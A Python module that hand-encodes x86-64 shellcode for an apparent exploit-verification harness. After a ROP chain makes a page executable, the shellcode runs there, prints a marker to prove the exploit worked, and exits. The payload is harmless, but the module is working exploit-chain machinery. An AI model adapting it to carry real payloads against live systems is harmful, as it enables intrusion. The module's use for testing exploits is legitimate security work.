"""Minimal position-aware x86-64 shellcode (pure stdlib, hand-encoded).

Used by the mprotect+shellcode L3 chain: after a ROP chain makes a page RWX and jumps to it,
this shellcode runs there. `write_marker` prints a marker (so the exploit is verifiable by
observed output) then exits cleanly.
"""
from __future__ import annotations

import struct


def _p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _p32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


# fixed byte length of the code template below; the marker is appended right after it, so its
# address is code_addr + _CODE_LEN.
_CODE_LEN = 45


def write_marker(marker: bytes, code_addr: int) -> bytes:
    """write(1, marker, len(marker)); exit(0). `code_addr` is where the shellcode is loaded,
    so it can point rsi at the marker bytes appended after the code."""
    code = (
        b"\x48\xc7\xc0\x01\x00\x00\x00"                 # mov rax, 1 (SYS_write)
        b"\x48\xc7\xc7\x01\x00\x00\x00"                 # mov rdi, 1 (stdout)
        + b"\x48\xbe" + _p64(code_addr + _CODE_LEN)     # mov rsi, &marker
        + b"\x48\xc7\xc2" + _p32(len(marker))           # mov rdx, len(marker)
        + b"\x0f\x05"                                   # syscall
        + b"\x48\xc7\xc0\x3c\x00\x00\x00"               # mov rax, 60 (SYS_exit)
        + b"\x48\x31\xff"                               # xor rdi, rdi
        + b"\x0f\x05"                                   # syscall
    )
    assert len(code) == _CODE_LEN, len(code)
    return code + marker
